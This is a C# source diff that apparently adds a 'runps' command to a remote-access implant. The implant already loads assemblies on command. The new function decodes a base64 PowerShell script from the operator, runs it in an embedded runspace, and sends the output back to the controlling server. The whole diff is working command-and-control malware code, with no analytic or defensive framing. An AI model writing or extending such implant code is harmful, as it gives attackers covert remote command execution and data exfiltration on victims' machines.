@@ -17,6 +17,27 @@ void assemblyload(string payload) {
     return;
 }
 
+void runpowershellscript(string[] arguments) {
+    string script = arguments[1];
+    string therestofarguments = "";
+    for (var i = 2; i < arguments.Length; i++) {
+        therestofarguments += " " + arguments[i];
+    }
+    byte[] bytearray = Convert.FromBase64String(script);
+    var command = Encoding.UTF8.GetString(bytearray, 0, bytearray.Length);
+    using (System.Management.Automation.PowerShell ps = System.Management.Automation.PowerShell.Create()) {
+        Console.WriteLine(command + therestofarguments);
+        ps.AddScript(command + therestofarguments);
+        ps.AddCommand("Out-String");
+        var results = ps.Invoke();
+
+        string returnvalue = "";
+        foreach (var result in results) {
+            returnvalue += result.ToString() + "\n";
+        }
+        sendmessagetoserver(returnvalue);
+    }
+}
 
 //built in command handler function
 bool handlecommands(string command) {
@@ -32,6 +53,9 @@ bool handlecommands(string command) {
     if (splits[0] == "load") {
         assemblyload(splits[1]);
         return true;
+    }
+    if (splits[0] == "runps") {
+        runpowershellscript(splits);
     }
 
     return false;
